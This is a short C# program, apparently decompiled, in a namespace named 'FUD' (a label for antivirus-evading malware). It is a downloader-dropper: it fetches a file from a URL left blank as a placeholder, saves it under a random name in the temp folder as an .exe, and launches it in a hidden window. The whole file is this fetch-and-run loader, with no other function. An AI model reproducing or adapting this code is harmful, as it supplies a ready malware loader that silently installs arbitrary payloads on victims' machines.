using System;
using System.Diagnostics;
using System.IO;
using System.Net;

namespace FUD
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		private static void Main(string[] args)
		{
			string url = "";
			string fileLocate = Program.FileName();
			Program.FileName();
			Program.Download(fileLocate, url);
			Program.Runprocess(fileLocate);
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000207A File Offset: 0x0000027A
		private static void Download(string FileLocate, string url)
		{
			new WebClient().DownloadFile(new Uri(url), FileLocate + ".exe");
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002098 File Offset: 0x00000298
		private static string FileName()
		{
			string tempPath = Path.GetTempPath();
			string Ran = Path.GetRandomFileName();
			return tempPath + Ran;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000020B6 File Offset: 0x000002B6
		private static void Runprocess(string FileLocate)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = FileLocate + ".exe",
					WindowStyle = ProcessWindowStyle.Hidden
				}
			}.Start();
		}
	}
}
